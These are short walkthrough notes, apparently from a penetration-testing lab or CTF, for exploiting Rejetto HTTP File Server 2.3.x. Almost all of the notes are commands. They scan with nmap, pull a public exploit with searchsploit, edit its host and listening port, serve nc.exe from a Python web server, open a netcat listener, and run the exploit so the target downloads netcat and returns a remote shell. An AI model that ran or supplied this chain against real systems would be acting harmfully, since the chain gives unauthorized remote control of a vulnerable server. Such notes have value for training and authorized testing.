* `nmap -sV [Target]`
* `searchsploit [Theservice found in the nmap scan]` --> In this case Rejetto HTTP File Server 2.3.x
* Make a copy of the exploit to my current working directory
* `searchsploit -m [Exploit ID in above list]`
* Run this exploit
  * `python [exploitname].py [Target IP]` --> It will not execute as we need to change the exploit
  * `vim [exploit file name]`
  * Edit the "host" to local host and "lport"
  * `:wq`
  * ***
  * A web server hosting Netcat needs to be setup to run this exploit
  * `cp /usr/share/windows-resources/binaries/nc.exe`
  * ***
  * Start a web server where nc.exe was downloaded
  * `python -m SimpleHTTPServer`
  * ***
  * Use netcat to start a listener
  * `nc -nvlp [port number specified in the exploit file via vim, like 1234]`
  * ***
  * Now execute `python [exploitname].py [Target IP]`
